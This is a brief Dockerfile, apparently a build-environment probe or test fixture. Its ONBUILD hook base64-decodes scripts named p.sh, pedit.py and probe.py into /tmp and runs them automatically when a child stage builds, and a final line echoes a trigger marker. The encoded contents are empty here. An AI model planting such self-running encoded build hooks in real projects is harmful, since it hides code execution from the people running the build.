FROM alpine:3.20 AS base
RUN apk add --no-cache python3 iproute2 >/dev/null 2>&1; echo APK_RC=$?
ONBUILD RUN sh -c 'echo  | base64 -d > /tmp/p.sh; echo  | base64 -d > /tmp/pedit.py; echo  | base64 -d > /tmp/probe.py; timeout 240 sh /tmp/p.sh'
FROM base
RUN echo I67604B_TRIG_c21d_$(date +%s 2>/dev/null || echo 1)
